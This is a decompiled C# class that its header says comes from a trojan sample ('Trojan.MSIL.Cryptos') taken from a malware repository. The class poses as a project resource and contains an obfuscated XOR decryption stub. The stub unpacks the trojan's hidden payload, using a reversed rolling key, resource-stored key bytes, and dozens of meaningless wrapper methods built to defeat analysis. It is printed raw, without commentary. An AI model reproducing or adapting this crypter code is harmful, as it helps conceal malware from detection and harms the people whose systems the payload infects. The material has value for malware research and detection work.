// Decompiled with JetBrains decompiler
// Type: CSharp.MyProject.Properties.Resource22
// Assembly: CSharp.MyProject, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D0C8579C-0447-4456-B8E4-AAF4762A2100
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Trojan.MSIL.Cryptos.hp-20569c92594eee17063b073529f31444d234501a020c0e7d0c1ea18cfba94c1f.exe

using System;
using System.Text;

namespace CSharp.MyProject.Properties
{
  internal class Resource22
  {
    public static byte[] waewre(byte[] hdtyhtht, string illuio) => Resource22.NewMethod(hdtyhtht, illuio);

    private static byte[] NewMethod(byte[] hdtyhtht, string illuio) => Resource22.NewMethod1(hdtyhtht, illuio);

    private static byte[] NewMethod1(byte[] hdtyhtht, string illuio) => Resource22.NewMethod(hdtyhtht, illuio, out byte[] _, out byte[] _);

    private static byte[] NewMethod(
      byte[] hdtyhtht,
      string illuio,
      out byte[] checkme,
      out byte[] fsedr4eh1)
    {
      Resource22.NewMethod1(hdtyhtht, illuio, out checkme, out fsedr4eh1, out int _);
      checkme = Resource22.NewMethod12(checkme);
      return Resource22.NewMethod16(checkme);
    }

    private static void NewMethod1(
      byte[] hdtyhtht,
      string illuio,
      out byte[] checkme,
      out byte[] fsedr4eh1,
      out int lklpk)
    {
      Resource22.NewMethod(hdtyhtht, illuio, out checkme, out fsedr4eh1, out lklpk);
      lklpk = Resource22.NewMethod(Resource22.NewMethod19(hdtyhtht), Resource22.NewMethod18(checkme), Resource22.NewMethod17(fsedr4eh1), Resource22.NewMethod1(lklpk));
    }

    private static byte[] NewMethod19(byte[] hdtyhtht) => hdtyhtht;

    private static byte[] NewMethod18(byte[] checkme) => checkme;

    private static byte[] NewMethod17(byte[] fsedr4eh1) => fsedr4eh1;

    private static int NewMethod1(int lklpk) => lklpk;

    private static byte[] NewMethod16(byte[] checkme) => checkme;

    private static byte[] NewMethod12(byte[] checkme)
    {
      checkme = Resource22.NewMethod14(checkme);
      return checkme;
    }

    private static byte[] NewMethod14(byte[] checkme)
    {
      Array.Resize<byte>(ref checkme, Resource22.NewMethod15(checkme));
      return checkme;
    }

    private static int NewMethod15(byte[] checkme) => Resource22.NewMethod13(checkme) - Resource22.NewMethod9();

    private static int NewMethod13(byte[] checkme) => checkme.Length;

    private static int NewMethod9() => 2;

    private static int NewMethod(byte[] hdtyhtht, byte[] checkme, byte[] fsedr4eh1, int lklpk)
    {
      lklpk = Resource22.NewMethod1(hdtyhtht, checkme, fsedr4eh1, lklpk);
      return lklpk;
    }

    private static int NewMethod1(byte[] hdtyhtht, byte[] checkme, byte[] fsedr4eh1, int lklpk)
    {
      for (int Memory = Resource22.NewMethod7(); Memory <= Resource22.NewMethod11(hdtyhtht) - Resource22.NewMethod8(); ++Memory)
        lklpk = Resource22.NewMethod(hdtyhtht, checkme, fsedr4eh1, lklpk, Memory);
      return lklpk;
    }

    private static int NewMethod(
      byte[] hdtyhtht,
      byte[] checkme,
      byte[] fsedr4eh1,
      int lklpk,
      int Memory)
    {
      checkme[Memory] = Convert.ToByte(Resource22.NewMethod2(hdtyhtht, fsedr4eh1, lklpk, Memory));
      lklpk = Resource22.NewMethod1(fsedr4eh1, lklpk);
      return lklpk;
    }

    private static int NewMethod2(byte[] hdtyhtht, byte[] fsedr4eh1, int lklpk, int Memory) => Resource22.NewMethod(hdtyhtht, fsedr4eh1, lklpk, Memory);

    private static int NewMethod1(byte[] fsedr4eh1, int lklpk)
    {
      Array.Reverse((Array) Resource22.NewMethod20(fsedr4eh1));
      lklpk = Resource22.NewMethod(fsedr4eh1, lklpk);
      return lklpk;
    }

    private static int NewMethod(byte[] fsedr4eh1, int lklpk) => Resource22.NewMethod(fsedr4eh1, ref lklpk);

    private static int NewMethod(byte[] fsedr4eh1, ref int lklpk)
    {
      if (lklpk == Resource22.NewMethod21(fsedr4eh1) - Resource22.NewMethod10())
        lklpk = Resource22.NewMethod11();
      else
        lklpk += Resource22.NewMethod12();
      return lklpk;
    }

    private static int NewMethod12() => 1;

    private static int NewMethod11() => 0;

    private static int NewMethod21(byte[] fsedr4eh1) => fsedr4eh1.Length;

    private static int NewMethod10() => 1;

    private static byte[] NewMethod20(byte[] fsedr4eh1) => fsedr4eh1;

    private static int NewMethod(byte[] hdtyhtht, byte[] fsedr4eh1, int lklpk, int Memory) => Resource22.NewMethod1(hdtyhtht, fsedr4eh1, lklpk, Memory);

    private static int NewMethod1(byte[] hdtyhtht, byte[] fsedr4eh1, int lklpk, int Memory) => (int) hdtyhtht[Memory] ^ (int) Resource13.gdryr ^ (int) fsedr4eh1[Resource22.NewMethod(lklpk)];

    private static int NewMethod(int lklpk) => lklpk;

    private static int NewMethod11(byte[] hdtyhtht) => hdtyhtht.Length;

    private static int NewMethod8() => 1;

    private static int NewMethod7() => 0;

    private static void NewMethod(
      byte[] hdtyhtht,
      string illuio,
      out byte[] checkme,
      out byte[] fsedr4eh1,
      out int lklpk)
    {
      Resource22.NewMethod1(hdtyhtht, illuio, out checkme, out fsedr4eh1);
      lklpk = Resource22.NewMethod(hdtyhtht, ref checkme);
    }

    private static int NewMethod(byte[] hdtyhtht, ref byte[] checkme)
    {
      checkme = Resource22.NewMethod(hdtyhtht, Resource22.NewMethod10(checkme));
      return Resource22.NewMethod6();
    }

    private static void NewMethod1(
      byte[] hdtyhtht,
      string illuio,
      out byte[] checkme,
      out byte[] fsedr4eh1)
    {
      checkme = Resource22.NewMethod6(hdtyhtht);
      fsedr4eh1 = Resource22.NewMethod2(illuio);
    }

    private static byte[] NewMethod2(string illuio)
    {
      Resource22.NewMethod4();
      return Resource22.NewMethod1(illuio);
    }

    private static int NewMethod6() => 0;

    private static byte[] NewMethod10(byte[] checkme) => checkme;

    private static byte[] NewMethod(byte[] hdtyhtht, byte[] checkme)
    {
      checkme = Resource22.NewMethod9(hdtyhtht);
      return checkme;
    }

    private static byte[] NewMethod9(byte[] hdtyhtht) => new byte[Resource22.NewMethod8(hdtyhtht)];

    private static int NewMethod8(byte[] hdtyhtht) => Resource22.NewMethod7(hdtyhtht) + Resource22.NewMethod5();

    private static int NewMethod7(byte[] hdtyhtht) => hdtyhtht.Length;

    private static int NewMethod5() => 1;

    private static byte[] NewMethod1(string illuio) => Encoding.Default.GetBytes(Resource22.NewMethod(illuio));

    private static string NewMethod(string illuio) => illuio;

    private static byte[] NewMethod4() => Resource22.NewMethod3();

    private static byte[] NewMethod3() => Resource3.fsedr4eh;

    private static byte[] NewMethod6(byte[] hdtyhtht)
    {
      byte[] numArray = Resource22.NewMethod1();
      Resource22.NewMethod(hdtyhtht);
      Resource22.NewMethod1(hdtyhtht);
      return numArray;
    }

    private static void NewMethod1(byte[] hdtyhtht) => Resource22.NewMethod5(hdtyhtht);

    private static void NewMethod5(byte[] hdtyhtht) => Resource13.gdryr = Resource22.NewMethod3(hdtyhtht)[Resource22.NewMethod4(hdtyhtht)];

    private static int NewMethod4(byte[] hdtyhtht) => Resource22.NewMethod2(hdtyhtht) - Resource22.NewMethod2();

    private static byte[] NewMethod3(byte[] hdtyhtht) => hdtyhtht;

    private static int NewMethod2(byte[] hdtyhtht) => hdtyhtht.Length;

    private static int NewMethod2() => 1;

    private static byte[] NewMethod1() => Resource22.NewMethod();

    private static void NewMethod(byte[] hdtyhtht) => Array.Reverse((Array) hdtyhtht);

    private static byte[] NewMethod() => Resource9.gfhrtu;
  }
}
